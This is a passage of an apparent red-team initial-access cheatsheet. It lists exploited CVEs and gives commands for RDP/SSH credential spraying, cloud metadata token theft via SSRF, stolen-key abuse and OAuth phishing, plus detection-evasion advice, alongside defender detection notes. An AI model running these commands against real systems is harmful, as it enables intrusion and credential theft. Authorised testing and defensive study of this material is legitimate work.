Citrix NetScaler          | CVE-2024-3661    | TunnelVision      | ✅
Citrix NetScaler          | CVE-2024-8534    | Memory safety     | ✅
Palo Alto GlobalProtect   | CVE-2024-3400    | Cmd injection     | 🔥📋
Palo Alto PAN-OS Mgmt     | CVE-2024-0012    | Auth bypass       | ✅📋
Palo Alto PAN-OS Mgmt     | CVE-2024-9474    | Privesc → root    | ✅📋
Palo Alto PAN-OS Mgmt     | CVE-2025-0108    | Auth bypass       | ✅📋
Check Point Quantum SG    | CVE-2024-24919   | Arbitrary file rd | ✅📋
Veeam Backup & Replication| CVE-2024-40711   | Unauth RCE        | 🔥📋
Veeam Backup & Replication| CVE-2025-23120   | Domain-user RCE   | 🔥📋
F5 BIG-IP                 | CVE-2023-46747   | Config util RCE   | ✅📋
F5 BIG-IP                 | CVE-2022-1388    | iControl bypass   | ✅📋
Sophos Firewall           | CVE-2024-12727   | Recent (late 2024)| 🔥
SonicWall SSL VPN         | CVE-2024-40766   | Mass exploitation | 🔥📋
                                                                 (Akira)
ScreenConnect             | CVE-2024-1709    | Auth bypass       | ✅📋
Cisco IOS XE              | CVE-2023-20198   | Web UI bypass     | ✅📋
Cisco IOS XE              | CVE-2023-20273   | Privesc chain     | ✅📋
Cisco NX-OS               | CVE-2024-20399   | CLI cmd injection | ✅
                                                                 (Velvet Ant)
SolarWinds Serv-U         | CVE-2024-28995   | Path traversal    | ✅📋
```

### 5.3 — Web Application CVE Matrix

```
═══════════════════════════════════════════════════════════
WEB APPLICATION CVE MATRIX (Q1-Q2 2026)
═══════════════════════════════════════════════════════════

CONFLUENCE:
  CVE-2023-22515 — Broken access control → create admin (pre-auth) ✅📋
  CVE-2023-22518 — Improper authorization → RCE ✅📋
  CVE-2022-26134 — OGNL injection → pre-auth RCE ✅📋
  CVE-2024-21683 — RCE (April 2024) ✅

EXCHANGE:
  ProxyShell  (CVE-2021-34473+34523+31207) — SSRF + privesc + RCE ✅📋
  ProxyNotShell (CVE-2022-41040+41082) — SSRF + RCE (auth req'd) ✅📋
  CVE-2024-21410 — NTLM relay via Exchange (Forest Blizzard) ✅📋
  CVE-2024-49040 — Spoofing in Exchange Server ✅
  CVE-2023-23397 — Outlook NTLM elevation via calendar ✅📋

SHAREPOINT (the Q3 2025 event):
  CVE-2025-49706 + CVE-2025-49704 + CVE-2025-53770 — "ToolShell" 🔥📋
  Source: https://unit42.paloaltonetworks.com/microsoft-sharepoint-cve-2025-49704-cve-2025-49706-cve-2025-53770/
  - Mass exploitation July 2025; 150+ orgs compromised
  - Pre-auth RCE chain on on-prem SharePoint
  - On-prem Exchange + SharePoint remain top targets — many orgs still
    run on-prem despite cloud migration push
  CVE-2023-29357 — Auth bypass → RCE chain with CVE-2023-24955 ✅📋

MOVEIT:
  CVE-2023-34362 — SQLi → RCE (CL0P mass data theft 2023) ✅📋

JENKINS:
  CVE-2024-23897 — Arbitrary file read via CLI args parsing ✅📋
  Same CVE used by LinkPro / Synacktiv intrusion chain (Persistence
  cheatsheet §9 eBPF Persistence) for AWS/K8s foothold Oct 2025.

JETBRAINS TEAMCITY:
  CVE-2024-27198 + CVE-2024-27199 — Auth bypass (March 2024) ✅📋
  Mass-exploited within days by APT29, BianLian ransomware, Lazarus

GITLAB:
  CVE-2024-45409 — SAML auth bypass (Sept 2024) ✅

ATLASSIAN BITBUCKET:
  CVE-2024-21689 — Cmd injection ✅

VEEAM:
  CVE-2024-40711 — Backup & Replication unauth RCE 🔥📋
  CVE-2025-23120 — Domain-user RCE (any domain user → SYSTEM) 🔥📋

VMWARE vCENTER:
  CVE-2021-22005 — File upload → RCE ✅📋
  CVE-2023-34048 — DCERPC OOB write RCE (UNC3886 / PRC) ✅📋
  CVE-2024-37079 / 37080 — DCERPC heap RCE (June 2024) ✅📋

CONNECTWISE SCREENCONNECT:
  CVE-2024-1709 + CVE-2024-1708 — Auth bypass + path traversal ✅📋
  Source: https://www.huntress.com/blog/a-catastrophe-for-control-understanding-the-screenconnect-authentication-bypass
  Mass exploitation Feb 2024; CVSS 10.0; /SetupWizard.aspx bypass

SAP NetWeaver:
  CVE-2025-31324 — Visual Composer RCE 🔥📋
  Source: https://www.rapid7.com/blog/post/2025/04/28/etr-active-exploitation-of-sap-netweaver-visual-composer-cve-2025-31324/
  CVSS 10.0; April 2025; active exploitation

ERLANG/OTP:
  CVE-2025-32433 — SSH server pre-auth RCE 🔥📋
  Source: https://unit42.paloaltonetworks.com/erlang-otp-cve-2025-32433/
  CVSS 10.0; April 2025; affects RabbitMQ + many other Erlang-based
  systems (CouchDB, Nakivo, others)

WINDOWS AFD.SYS:
  CVE-2024-38193 — Lazarus exploitation Aug 2024 ✅📋
  Default driver; CVSS 7.8; LPE

SERVICENOW NOW PLATFORM:
  CVE-2024-4879 — Now Platform RCE (July 2024) ✅
```

### 5.4 — Cloud-Native CVE Matrix

```
═══════════════════════════════════════════════════════════
CLOUD-NATIVE / KUBERNETES CVE MATRIX
═══════════════════════════════════════════════════════════

KUBERNETES INGRESS NGINX:
  CVE-2025-1097 + chain — "IngressNightmare" 🔥
  Source: https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
  March 2025; CVSS 8.8; 5-CVE chain for unauth cluster compromise
  via the ingress-nginx admission webhook

KUBERNETES KUBELET:
  Various legacy CVEs; main risk in 2026 is anonymous-access misconfig
  (cross-ref active recon §3.8 corrected framing on kubelet 10250 vs
  API server 6443 defaults; fine-grained authz GA April 2026 in v1.36)

DOCKER / CONTAINERD:
  CVE-2024-23653 (BuildKit) — sandbox escape ✅
  CVE-2024-21626 (runc / Leaky Vessels) — container escape ✅📋
  Multiple historical (CVE-2019-5736, CVE-2022-0185, CVE-2022-0492)

ARGOCD:
  CVE-2024-31989 — RBAC bypass ✅
  CVE-2023-50729 — auth bypass ✅
```

### 5.5 — Exploit Frameworks & Methodology

```
═══════════════════════════════════════════════════════════
EXPLOIT FRAMEWORKS + POST-EXPLOIT-ON-EDGE-DEVICE WORKFLOW
═══════════════════════════════════════════════════════════

METASPLOIT:
  msfconsole
  search type:exploit <product>
  use exploit/path/to/module
  set RHOSTS target.com && set LHOST <IP> && exploit
  CAVEAT: default payloads heavily signatured; substitute custom payloads
  for live operations.

MANUAL POC + GITHUB CVE PoC:
  searchsploit <product> <version>
  # GitHub: search "CVE-YYYY-NNNNN PoC" → REVIEW CODE BEFORE RUNNING
  # Verify it does what it claims; check for backdoors / unintended DoS

POST-EXPLOIT ON EDGE DEVICE (typical workflow):
  1. Establish reverse shell or implant on the appliance
  2. Dump credentials stored on device (VPN users, LDAP bind creds,
     certificates)
  3. Identify internal network ranges (routing table, ARP cache,
     interface configuration)
  4. Pivot to internal network through the compromised appliance
  5. Deploy persistence on the appliance (Persistence cheatsheet)

DETECTION:
  - Appliance integrity checks, unexpected processes, modified firmware
  - Vendor-specific forensic tools (Fortinet DART, Ivanti ICT, Palo Alto
    Best Practice Assessment)
  - CISA + vendor IoCs published per major CVE wave

OPSEC:
  Edge-device exploitation is QUIET — typically NO endpoint EDR on
  appliance. Defender attention shifts to outbound traffic patterns
  + downstream compromise indicators (lateral movement to AD).
```

```
═══════════════════════════════════════════════════════════
SECTION 5 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §6 external remote services (post-exploit pivot)
Enables → §04 Persistence (appliance-level + AD-level)
Enables → §05 Privilege Escalation (cred extraction → DA path)
Prereq → Active recon §4 (edge appliance fingerprinting + version)
Cross-ref → §4.8 active recon (full edge-CVE matrix with Nuclei tags)
Cross-ref → CISA BOD 26-02 — EOS appliance decommission timeline
Cross-ref → §3.8 K8s active recon (kubelet vs API server defaults)
```

---

## 6 — EXTERNAL REMOTE SERVICES

> **Typical chains through this section:** Stolen creds (§4) or AiTM-captured tokens (§2.1) → external remote service auth → internal network access → lateral movement (§06 cheatsheet). RDP remains in 84% of IR/MDR cases per Sophos AAR 2025; compromised credentials are #1 root cause of attacks (41%) for 2nd consecutive year.

### 6.1 — VPN Access with Stolen / Sprayed Credentials

```
═══════════════════════════════════════════════════════════
VPN ACCESS WITH STOLEN OR SPRAYED CREDENTIALS
MITRE ATT&CK: T1133 (External Remote Services), T1078 (Valid Accounts)
STEALTH: MEDIUM (legitimate auth flow); HIGH if connecting from residential IP
SUCCESS: HIGH (if creds + MFA-bypass path)
SKILL: LOW
═══════════════════════════════════════════════════════════

WORKFLOW (after §4 cred acquisition or §2 AiTM):
  1. Connect to target VPN with valid credentials
  2. If MFA enforced: use stolen session token, OR bypass via:
     - Enrolled MFA device from compromised account
     - Help desk vishing for MFA reset (§2.3)
     - Push bombing if number-matching disabled (§4.3)
     - SIM swap (high-effort, telecom-side compromise; Salt Typhoon
       compromise of US telcos elevates this risk in 2026)
  3. Post-connect: internal network access → §06 lateral movement

VPN VENDOR NOTES (post-exploitation observation):
  - Cisco Secure Client (formerly AnyConnect, renamed July 2022; legacy
    AnyConnect EOL March 2024)
  - Fortinet FortiClient (cross-ref §5 CVE matrix)
  - Palo Alto GlobalProtect (cross-ref §5 CVE matrix)
  - Pulse Secure / Ivanti Connect Secure (cross-ref §5)
  - Citrix Gateway (cross-ref §5)
  - F5 BIG-IP APM (cross-ref §5)
  - Zscaler ZIA / ZPA (modern SASE; less commonly compromised at gateway
    layer; primary risk is identity-side via §2 + §7)
  - OpenVPN / WireGuard (self-hosted; usually with cert auth — harder to
    casual attacker; primary risk is server-side compromise)

DETECTION:
  - VPN login from unusual location/device
  - After-hours access (compare to user historical pattern)
  - Identity Protection: "Atypical sign-in properties"
  - VPN appliance logs (especially Ivanti / Fortinet / Palo Alto with
    detailed audit enabled)

OPSEC:
  - Connect from residential IP (not VPS/cloud — flagged immediately)
  - Match user's timezone + working hours
  - Use residential proxy networks if needed (BrightData, Smartproxy —
    legal/ethical concerns; engagement RoE must permit)
```

### 6.2 — RDP

```
═══════════════════════════════════════════════════════════
RDP (T1021.001) — REMAINS DOMINANT 2024-2026
MITRE ATT&CK: T1021.001 (Remote Services: RDP)
STEALTH: LOW (heavily monitored)
SUCCESS: MEDIUM (if exposed and creds available)
SKILL: LOW
═══════════════════════════════════════════════════════════

EXPOSED RDP REMAINS A TOP INITIAL ACCESS VECTOR per Sophos AAR 2025:
RDP involved in 84% of IR/MDR cases in 2024 (down from 90% in 2023 —
still dominant). Compromised credentials = #1 root cause of attacks for
2nd year in a row (41%).

CRED-SPRAY VS RDP:
  nxc rdp target.com -u users.txt -p "Spring2026!" --continue-on-success
  hydra -L users.txt -P passwords.txt rdp://target.com

  # Crowbar (if no lockout policy):
  crowbar -b rdp -s target.com/32 -U users.txt -C passwords.txt

MODERN RDP CVES (cross-ref active recon §3.9):
  - CVE-2024-38077 (Windows RDS LSA RCE) — pre-auth, CVSS 9.8;
    widespread but limited public PoC reliability
  - CVE-2025-21323 (RDP NTLM relay) — patched Jan 2025; legacy boxes
    still vulnerable
  - BlueKeep / DejaBlue era (CVE-2019-0708 / 1181/1182/1222/1226) —
    decade-old but legacy unpatched still encountered

DETECTION:
  - Event ID 4624 type 10 (RDP logon)
  - TerminalServices-LocalSessionManager 21/25
  - MDI: "Suspected brute-force attack (RDP)"
  - Network: outbound RDP from non-IT subnet to external (data exfil
    pattern via RDP clipboard / drive redirection)

OPSEC: LOW stealth — RDP is heavily monitored. Prefer VPN access if
  available. Never attempt without confirmed creds.
```

### 6.3 — SSH

```
═══════════════════════════════════════════════════════════
SSH (T1021.004) + 2024 CVE LANDSCAPE
MITRE ATT&CK: T1021.004 (Remote Services: SSH)
STEALTH: MEDIUM (SSH normal; brute force obvious)
═══════════════════════════════════════════════════════════

CRED-BASED:
  hydra -L users.txt -P passwords.txt ssh://target.com

KEY-BASED:
  # Check breach data for leaked SSH keys
  # Check stealer logs for FileZilla / WinSCP / PuTTY private key files
  # Exposed SSH with weak/default keys on IoT/network devices

MODERN OPENSSH CVES:
  - CVE-2024-6387 "regreSSHion" — signal-handler race in OpenSSH 8.5p1
    - 9.7p1 (patched June 2024); PoC exists, low reliability against
    modern glibc; documented successful exploitation reported by
    Qualys research
  - CVE-2025-32433 — Erlang/OTP SSH server pre-auth RCE (April 2025;
    affects Erlang-based SSH implementations)

DETECTION:
  - /var/log/auth.log
  - Failed auth rate (fail2ban-class auto-blocking)
  - Modern Linux EDR (Falcon, S1, Defender for Endpoint Linux): SSH
    behavioral analysis

OPSEC: MEDIUM — SSH is normal; brute force obvious. Prefer key + cred
  combination from breach data over blind brute.
```

### 6.4 — Exposed Management Interfaces

```
═══════════════════════════════════════════════════════════
EXPOSED MANAGEMENT INTERFACES
MITRE ATT&CK: T1190 (Exploit Public-Facing Application), T1133
STEALTH: HIGH (depends on default-creds vs auth bypass)
═══════════════════════════════════════════════════════════

DISCOVERY (Shodan / Censys / Quake / Hunter):
  shodan search "org:Target Corp" "port:3389 OR port:22 OR port:443"

LOOK FOR (high-value misconfig targets):
  Jenkins (8080), Grafana (3000), Kibana (5601), phpMyAdmin (80/443),
  Tomcat Manager (8080), Kubernetes API (6443), Docker API (2375/2376),
  etcd (2379), Elasticsearch (9200), Redis (6379), MongoDB (27017),
  RabbitMQ Mgmt (15672), ActiveMQ Mgmt (8161), Vault (8200), Consul (8500),
  Nexus Repository (8081), Artifactory (8081), Harbor (443), GitLab (80/443),
  HAProxy stats (port varies), TeamCity (8111), Bamboo (8085)

DEFAULT CREDENTIAL DATABASES:
  /usr/share/seclists/Passwords/Default-Credentials/
  https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
  https://cirt.net/passwords (CIRT.net default password DB)

NUCLEI DEFAULT-LOGIN TEMPLATES:
  nuclei -u https://target.com:8443 -t default-logins/ -silent
  nuclei -l mgmt_interfaces.txt -t default-logins/ -t exposures/

(Cross-ref active recon §3.10 + §3.15 + §3.16 for full per-service
enumeration depth.)
```

```
═══════════════════════════════════════════════════════════
SECTION 6 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §06 Lateral Movement (post-VPN/RDP foothold → AD pivot)
Enables → §05 Privilege Escalation (mgmt interface → host RCE)
Prereq → §4 credential attacks OR §2 phishing for valid creds
Cross-ref → Active recon §3 service enumeration depth
Cross-ref → Active recon §4 edge appliance fingerprinting
NEVER → Brute-force RDP / SSH at scale without confirmed cred candidate;
        all major IDS catches this in seconds
```

---

## 7 — CLOUD & IDENTITY-PLANE INITIAL ACCESS

> **Typical chains through this section:** Cloud-provider identification (passive recon §7) → unauthenticated probes for misconfig → with-creds access (from §4 stealer logs / §2 AiTM tokens) → cloud-API enumeration → identity-plane pivot via OAuth/SCIM/SAML → SaaS-to-SaaS expansion.

### 7.1 — AWS — Extended

```bash
# ═══════════════════════════════════════════════════════════
# AWS INITIAL ACCESS — EXTENDED
# MITRE ATT&CK: T1078.004 (Valid Accounts: Cloud), T1199, T1525
# STEALTH: VARIES (unauth probes LOW; authenticated AWS = CloudTrail)
# ═══════════════════════════════════════════════════════════

# ─── MISCONFIGURED S3 BUCKETS ──────────────────────────────
aws s3 ls s3://target-bucket --no-sign-request    # Public bucket
aws s3 cp s3://target-bucket/backup.sql . --no-sign-request

# Per-region probe
for region in us-east-1 us-east-2 us-west-1 us-west-2 eu-west-1 eu-central-1 \
              ap-southeast-1 ap-northeast-1; do
  aws s3 ls s3://target-bucket --region $region --no-sign-request 2>&1 | head -1
done

# ─── EXPOSED AWS CREDENTIALS ───────────────────────────────
# Search GitHub/GitLab for: "target.com" AWS_ACCESS_KEY AKIA
# Check: .env files, docker-compose.yml, Terraform state files,
# CI/CD secrets (cross-ref active recon §5.3 GitHub Code Search)

# ─── SSRF → IMDSv1/v2 METADATA ─────────────────────────────
# Recon-adjacent — only reachable via SSRF in target's app
# IMDSv1 (legacy, still encountered):
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# IMDSv2 (mandatory new EC2 since 2024; requires PUT-then-GET token flow):
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
         -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
     http://169.254.169.254/latest/meta-data/iam/security-credentials/

# ─── COGNITO IDENTITY POOL MISCONFIG ────────────────────────
# Unauthenticated access enabled → temporary AWS credentials
aws cognito-identity get-id --identity-pool-id <POOL_ID> --region us-east-1
aws cognito-identity get-credentials-for-identity --identity-id <ID> --region us-east-1

# Credentials returned grant role permissions tied to the identity pool
# (often over-permissive in dev/test deployments)

# ─── LAMBDA FUNCTION URLs (PUBLIC EXPOSURE) ────────────────
# Pattern: https://<url-id>.lambda-url.<region>.on.aws/
# Discovery via target's web app links / CT log search
curl -s "https://crt.sh/?q=%25.lambda-url.%25.on.aws&output=json" \
  | jq -r '.[].name_value' | grep -i target

# Test for unauthenticated invocation (auth-type NONE)
curl -X POST https://<url-id>.lambda-url.<region>.on.aws/ -d '{"test":"data"}'

# ─── API GATEWAY ENDPOINTS ─────────────────────────────────
# Pattern: https://<api-id>.execute-api.<region>.amazonaws.com/<stage>/
# CT log discovery
curl -s "https://crt.sh/?q=%25.execute-api.%25.amazonaws.com&output=json" | head

# Common misconfig: stage with NONE authorizer → unauth API access

# ─── ECR PUBLIC TYPOSQUATTING ──────────────────────────────
# AWS ECR Public Gallery: gallery.ecr.aws/<alias>/<image>
# Operator pattern: register similar-named alias to target's public images
# → users pulling typo'd image get attacker payload
# Defender: image signature verification + cosign / sigstore adoption

# ─── AWS IAM IDENTITY CENTER (FORMERLY SSO) SESSION HIJACK ─
# IAM Identity Center session = single token grants access to ALL
# assigned AWS accounts for that user
# Theft via:
# - Browser session cookie theft (infostealer)
# - AiTM phishing of IAM Identity Center login
# - Compromise of user's workstation → ~/.aws/sso/cache/ tokens
# Once obtained: aws sso login --profile <profile> bypassed; direct
# token use grants account access without re-auth

# ─── AWS CONSOLE FEDERATION LOGIN ABUSE ────────────────────
# AWS console federation URL pattern:
# https://signin.aws.amazon.com/federation?Action=getSigninToken
# &SessionDuration=43200
# &Session={"sessionId":"XXX","sessionKey":"XXX","sessionToken":"XXX"}
# With valid temporary creds → mint console URL for browser access
aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<role> --role-session-name redteam
# Use returned creds to construct federated console URL via:
# https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_enable-console-custom-url.html

# ─── SCP / OU POLICY BYPASS PATTERNS ───────────────────────
# Service Control Policies enforce permissions at AWS Organizations level
# Common bypass: services that pre-date SCP coverage (rare in 2026 but
# still encountered), or actions taken from accounts outside the SCP scope
aws organizations describe-policy --policy-id <id>  # Requires org-mgmt access
aws organizations list-policies --filter SERVICE_CONTROL_POLICY  # Enum

# ─── PUBLIC EBS SNAPSHOTS ──────────────────────────────────
# CRITICAL: --owner-ids self returns YOUR snapshots, not target's.
# To find PUBLIC snapshots, use --restorable-by-user-ids all
aws ec2 describe-snapshots --restorable-by-user-ids all \
     --filters "Name=description,Values=*target*" --region us-east-1 \
     --query 'Snapshots[*].[SnapshotId,Description,VolumeSize]'

# Or by known target account ID (cross-ref passive recon §7.5 for AWS
# account-ID enumeration)
aws ec2 describe-snapshots --owner-ids <TARGET_ACCT_ID> --region us-east-1

# ─── DETECTION (defender awareness) ────────────────────────
# - CloudTrail: every authenticated AWS API call logged
# - GuardDuty: malicious IP communication, unusual API patterns
# - CSPM (Wiz / Lacework / Orca): exposed asset detection, IAM
#   over-permissioning, cross-account trust analysis
# - Detective: graph-based threat investigation

# ─── OPSEC ─────────────────────────────────────────────────
# - aws s3 ls --no-sign-request works for unauth checks; most other
#   AWS CLI commands require AWS credentials AND are FULLY LOGGED
# - Authenticated enum from operator IP burns the account; rotate keys
#   per engagement; use --profile + temp creds where possible
```

### 7.2 — Azure / Entra ID — Extended

```bash
# ═══════════════════════════════════════════════════════════
# AZURE / ENTRA ID INITIAL ACCESS — EXTENDED
# MITRE ATT&CK: T1078.004, T1098.005 (Account Manipulation: Device Reg)
# STEALTH: HIGH (legitimate session); LOW once XDR correlates anomaly
# ═══════════════════════════════════════════════════════════

# ─── DEVICE CODE + OAUTH PHISHING (cross-ref §2.2 + §2.5) ──

# ─── PASSWORD SPRAY (cross-ref §4.2) ───────────────────────

# ─── EXPOSED AZURE BLOB STORAGE ────────────────────────────
# https://<account>.blob.core.windows.net/<container>?restype=container&comp=list
# Anonymous container listing only works if BOTH account AND container
# have anonymous access enabled (OFF by default since 2023)
curl -s "https://target.blob.core.windows.net/<container>?restype=container&comp=list"

# All Azure storage subdomain variants
for variant in blob file queue table dfs; do
  nslookup target.${variant}.core.windows.net
done

# ─── ENTRA TENANT OUTSIDER RECON (cross-ref passive recon §7.3) ─
# AADInternals — primary outsider recon toolkit
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -DomainName target.com
Get-AADIntTenantInformation -Domain target.com

# ─── MANAGED IDENTITY ABUSE (post-foothold on Azure resource) ─
# Managed Identities provide implicit auth for Azure resources
# (VMs, App Services, Logic Apps, Function Apps)
# From a compromised Azure VM:
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true"
# Returns access token for the VM's managed identity → use for ARM API access

# ─── PIM (PRIVILEGED IDENTITY MANAGEMENT) ELEVATION ABUSE ──
# PIM allows just-in-time elevation to privileged roles
# From a compromised user with PIM-eligible role:
# - Request elevation via Entra portal or Graph API
# - If approval-required policy: requires social engineering of approver
# - If no approval policy: elevates immediately
az role assignment list --assignee <user> --include-classic-administrators
az role assignment list-for-resource --scope <resource>

# Detection: Entra Audit Log "Add member to role" with PIM context

# ─── CROSS-TENANT ACCESS POLICY ABUSE ──────────────────────
# Cross-tenant access policy controls B2B collaboration + cross-tenant sync
# Storm-0501 pattern (per Microsoft Threat Intel Aug 2025): abuse
# permissive cross-tenant access to pivot from compromised partner
# tenant to target tenant
# Enumeration:
Get-MgPolicyCrossTenantAccessPolicyDefault    # Default policy
Get-MgPolicyCrossTenantAccessPolicyPartner   # Per-partner settings

# Compromised partner tenant + permissive cross-tenant policy:
# - Attacker auth to partner tenant via own creds
# - Cross-tenant sync may push attacker identity into target tenant
# - Or: B2B invitation accepted automatically

# ─── SERVICE PRINCIPAL CREDENTIAL ABUSE ────────────────────
# Service Principals (SP) often over-permissioned + credentials rarely
# rotated
# Enum (with creds):
az ad sp list --query "[?contains(displayName,'Target')].{name:displayName, appId:appId, objectId:id}"
az ad app credential list --id <appId>  # List SP credentials

# Compromise pattern: leaked SP secret (GitHub, etc.) → grants persistent
# API access without MFA / Conditional Access (most CA policies don't
# apply to service principals by default — operator opportunity)

# ─── CONDITIONAL ACCESS POLICY ENUMERATION ─────────────────
# With creds — enumerate target's CA policies to plan bypass
Get-MgIdentityConditionalAccessPolicy | Format-Table DisplayName, State, Conditions
# Reveals: which apps require MFA, which IPs are trusted, whether
# Token Protection / compliant device required, Authentication Strengths

# ─── AZUREHOUND (POST-CRED ENUMERATION) ────────────────────
# v2.11.0+ March 2026 — actively weaponized by Storm-0501, Void Blizzard
azurehound -u user@target.com -p 'pass' --tenant target.com list

# ─── ROADtools (POST-CRED) ─────────────────────────────────
roadrecon auth -u user@target.com -p 'pass'
roadrecon gather                     # May fail on hardened tenants (Q2 2026 issue)
roadrecon gui

# ─── DETECTION ─────────────────────────────────────────────
# - Entra Sign-in logs + Identity Protection (atypical sign-in,
#   anonymous IP, malware-linked IP)
# - Defender for Cloud Apps (MDCA) for SaaS-side anomaly + session
# - Defender XDR cross-product correlation
# - Azure Activity Log + per-resource Resource Logs
# - Microsoft Sentinel SOAR playbooks

# ─── OPSEC ─────────────────────────────────────────────────
# Authenticated Entra activity is FULLY LOGGED. Azure Activity Log +
# Entra Audit Log + Sign-in Logs + per-resource Diagnostic Settings
# capture all API operations. Operator caution: every read action is
# logged regardless of result.
```

```
═══════════════════════════════════════════════════════════
SECTION 7 (PART 1) — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §05 Privilege Escalation cloud-side (PIM elevation, SP
          credential abuse, Managed Identity expansion)
Enables → §06 Lateral Movement (cross-account / cross-tenant pivot)
Cross-ref → §2.5 OAuth consent (pre-foothold) vs §7.5 post-foothold
Cross-ref → Passive recon §7 cloud provider identification
NEVER → Authenticated enumeration without RoE awareness — every API
        call logged, increases blast-radius of engagement detection
```

### 7.3 — GCP — Fully Expanded

```bash
# ═══════════════════════════════════════════════════════════
# GCP INITIAL ACCESS — FULLY EXPANDED
# MITRE ATT&CK: T1078.004, T1199, T1525, T1136.003 (Cloud Account Create)
# STEALTH: VARIES (unauth probes LOW; authenticated GCP = Cloud Audit Logs)
# ═══════════════════════════════════════════════════════════

# ─── EXPOSED GCS BUCKETS ───────────────────────────────────
gsutil ls gs://target-bucket                           # If public
curl -s "https://storage.googleapis.com/target-bucket/"
curl -s "https://target-bucket.storage.googleapis.com/"

# Bulk pattern testing
for purpose in backup data logs assets prod dev staging; do
  for prefix in target target-corp target-prod; do
    curl -sI "https://storage.googleapis.com/${prefix}-${purpose}/" | head -1
  done
done

# GCP Project ID guessing (project IDs globally unique, lowercase, 6-30
# chars, hyphens allowed)
gobuster dir -u "https://storage.googleapis.com/" \
        -w /usr/share/seclists/Discovery/Cloud/gcp-buckets.txt -t 10

# GCPBucketBrute (RhinoSecurityLabs)
# https://github.com/RhinoSecurityLabs/GCPBucketBrute
python3 gcpbucketbrute.py -k target -u

# ─── SERVICE ACCOUNT KEY LEAKS ─────────────────────────────
# Search GitHub: "target" "private_key_id" type:"service_account"
# Search GitHub: "target" "type": "service_account"
# Service account JSON file pattern:
#   {"type": "service_account", "project_id": "...", "private_key_id": "..."}

# Once obtained:
gcloud auth activate-service-account --key-file=stolen.json
gcloud projects list
gcloud iam service-accounts list --project=<project>

# ─── SSRF → GCP METADATA ───────────────────────────────────
curl -H "Metadata-Flavor: Google" \
     http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Returns OAuth token for the instance's attached service account

# Recursive metadata enumeration
curl -H "Metadata-Flavor: Google" \
     "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json"

# ─── SERVICE ACCOUNT IMPERSONATION CHAINS ──────────────────
# GCP IAM permission iam.serviceAccounts.actAs allows acting as another SA
# Compromise of SA-A with actAs on SA-B → access SA-B's permissions
gcloud auth print-access-token \
       --impersonate-service-account=<sa>@<project>.iam.gserviceaccount.com

# Enumeration:
gcloud iam service-accounts get-iam-policy <sa>@<project>.iam.gserviceaccount.com
# Look for: roles/iam.serviceAccountTokenCreator (allows impersonation)

# Multi-hop impersonation chains: SA-A → SA-B → SA-C → resource
# Tools: GCP-IAM-Privilege-Escalation (RhinoSecurityLabs) enumerates
# https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
python3 gcp_enum.py --keyfile <sa.json> --project <project>

# ─── WORKLOAD IDENTITY FEDERATION ABUSE ────────────────────
# Workload Identity Federation enables external (non-GCP) identities to
# impersonate GCP service accounts via OIDC/SAML token exchange
# Common configurations: GitHub Actions OIDC → GCP SA
gcloud iam workload-identity-pools list --location=global
gcloud iam workload-identity-pools providers list \
       --location=global --workload-identity-pool=<pool>

# Compromised GitHub repo with OIDC federation → mint GCP token via:
# https://cloud.google.com/iam/docs/workload-identity-federation

# ─── GKE WORKLOAD IDENTITY ABUSE ───────────────────────────
# GKE workload identity binds K8s service accounts to GCP service accounts
# Compromised pod with workload-identity-bound SA → cloud-API access via
# the metadata server (similar to IMDS pattern)
curl -H "Metadata-Flavor: Google" \
     http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# ─── GOOGLE WORKSPACE OAUTH (parallels M365 §2.5) ──────────
# Malicious app requests Gmail / Drive / Calendar scopes
# Workspace admin can blocklist/allowlist apps via Admin Console
# App Verification: Google Cloud Trust & Safety review for sensitive scopes
# Phishing URL pattern:
# https://accounts.google.com/o/oauth2/v2/auth?
#   client_id=<atk>&redirect_uri=<atk>&response_type=code
#   &scope=https://www.googleapis.com/auth/gmail.readonly

# ─── BIGQUERY CROSS-PROJECT DATA ACCESS ────────────────────
# BigQuery datasets can be authorized for cross-project access
# Misconfig: dataset shared "everyone with link" or "all authenticated users"
gcloud projects list --filter="bigquery.api.dataset.access.special_group=allAuthenticatedUsers"
bq ls --project_id=<other_project>  # If access misconfigured

# ─── CLOUD RUN / CLOUD FUNCTIONS DISCOVERY ─────────────────
# Cloud Run pattern: <service>-<hash>-<region>.run.app
# Cloud Functions pattern: https://<region>-<project>.cloudfunctions.net/<function>
# CT log discovery (cross-ref passive recon §1.2)
curl -s "https://crt.sh/?q=%25.run.app&output=json" | jq -r '.[].name_value' | grep -i target
curl -s "https://crt.sh/?q=%25.cloudfunctions.net&output=json" | grep -i target

# Test for unauthenticated invocation
curl -X GET https://<service>-<hash>-<region>.run.app/

# ─── GCP ORGANIZATION POLICY BYPASS ────────────────────────
# Organization policies enforce constraints at org/folder/project level
# Common bypass: services not yet covered by constraint, or actions in
# regions excluded from constraint scope
gcloud resource-manager org-policies list --organization=<org_id>

# ─── DETECTION ─────────────────────────────────────────────
# - Cloud Audit Logs: Admin Activity (always on) + Data Access (opt-in)
# - Security Command Center (SCC) Premium: continuous misconfig
#   detection, threat detection
# - VPC Service Controls: data exfil prevention via service perimeter
# - Cloud DLP: data classification + leak detection
# - Chronicle (Google's SIEM): cross-product correlation

# ─── OPSEC ─────────────────────────────────────────────────
# - Admin Activity logs ALWAYS on; Data Access logs opt-in (less coverage
#   on read operations historically — verify per project)
# - Service account impersonation logged as caller=impersonator-sa
#   actor=impersonated-sa — chains traceable
# - GCP CloudFox / Pacu equivalent for GCP recon: gcp_enum.py +
#   GCPBucketBrute + ScoutSuite
```

### 7.4 — Kubernetes — Extended

```bash
# ═══════════════════════════════════════════════════════════
